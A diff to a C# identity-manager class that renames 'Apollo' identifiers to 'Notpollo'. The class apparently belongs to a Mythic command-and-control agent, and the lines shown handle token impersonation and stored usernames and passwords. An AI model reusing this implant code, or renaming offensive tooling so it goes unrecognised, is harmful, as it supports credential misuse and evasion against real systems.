@@ -1,25 +1,25 @@
-﻿using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
+﻿using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.NotpolloStructs;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Security.Principal;
 using System.Text;
-using ApolloInterop.Classes.Api;
-using static ApolloInterop.Enums.Win32;
-using static ApolloInterop.Constants.Win32;
+using NotpolloInterop.Classes.Api;
+using static NotpolloInterop.Enums.Win32;
+using static NotpolloInterop.Constants.Win32;
 using System.Runtime.InteropServices;
-using static ApolloInterop.Structs.Win32;
-using ApolloInterop.Structs.MythicStructs;
+using static NotpolloInterop.Structs.Win32;
+using NotpolloInterop.Structs.MythicStructs;
 using System.Security;
 
-namespace Apollo.Management.Identity
+namespace Notpollo.Management.Identity
 {
     public class IdentityManager : IIdentityManager
     {
         private IAgent _agent;
 
-        private ApolloLogonInformation _userCredential;
+        private NotpolloLogonInformation _userCredential;
         private WindowsIdentity _originalIdentity = WindowsIdentity.GetCurrent();
         private WindowsIdentity _currentPrimaryIdentity = WindowsIdentity.GetCurrent();
         private WindowsIdentity _currentImpersonationIdentity = WindowsIdentity.GetCurrent();
@@ -241,7 +241,7 @@ namespace Apollo.Management.Identity
             return _originalIdentity;
         }
 
-        public bool SetIdentity(ApolloLogonInformation logonInfo)
+        public bool SetIdentity(NotpolloLogonInformation logonInfo)
         {
             bool bRet = false;
             int dwError = 0;
@@ -311,7 +311,7 @@ namespace Apollo.Management.Identity
         public void Revert()
         {
             _SetThreadToken(ref _executingThread, _originalImpersonationToken);
-            _userCredential = new ApolloLogonInformation();
+            _userCredential = new NotpolloLogonInformation();
             _currentImpersonationIdentity = _originalIdentity;
             _currentPrimaryIdentity = _originalIdentity;
             _isImpersonating = false;
@@ -327,7 +327,7 @@ namespace Apollo.Management.Identity
             return _currentImpersonationIdentity;
         }
 
-        public bool GetCurrentLogonInformation(out ApolloLogonInformation logonInfo)
+        public bool GetCurrentLogonInformation(out NotpolloLogonInformation logonInfo)
         {
             if (!string.IsNullOrEmpty(_userCredential.Username) &&
                 !string.IsNullOrEmpty(_userCredential.Password))
@@ -335,7 +335,7 @@ namespace Apollo.Management.Identity
                 logonInfo = _userCredential;
                 return true;
             }
-            logonInfo = new ApolloLogonInformation();
+            logonInfo = new NotpolloLogonInformation();
             return false;
         }
     }
